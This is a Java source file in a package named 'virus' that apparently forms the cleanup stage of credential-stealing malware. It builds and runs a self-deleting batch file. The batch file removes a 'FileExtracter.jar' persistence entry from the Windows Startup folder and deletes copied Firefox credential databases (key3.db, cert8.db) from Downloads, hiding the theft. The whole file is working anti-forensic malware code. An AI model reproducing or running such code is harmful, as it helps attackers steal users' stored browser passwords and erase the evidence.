package virus;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.Runtime;

public class Delete {
	public static void delete(){
		try {
			//stuff to put into bat
			
			String address1 = "\"%USERPROFILE%\\Downloads\\"; //downloads Folder
			String address2 = "\r\ndel \"%Appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"; //Startup Folder
		    String del = "\r\ndel ";
		    String content = "ECHO OFF "+address2+"FileExtracter.jar\" "
		    				+del+address1+"\\key3.db\" "
		    				+del+address1+"\\cert8.db\" "
		    				+del+address2+"del.bat\" "
		    				+"&& exit";
			
		    
		    File file = new File("del.txt");
		    File bat = new File("del.bat");
			//check to ensure file doesn't exist
			if (!bat.exists()) {
				file.createNewFile();
				//write data
				FileWriter fw = new FileWriter(file.getAbsoluteFile());
				BufferedWriter bw = new BufferedWriter(fw);
				bw.write(content);
				bw.close();

			}
  
			System.out.println("Done");
 
			//convert to BAT file
		    File file1 = new File("del.txt");
		    File file2 = new File("del.bat");
		    file1.renameTo(file2);
		    Runtime.getRuntime().exec("cmd /c start del.bat");
		} catch (IOException e) {
			e.printStackTrace();
		}


	}
}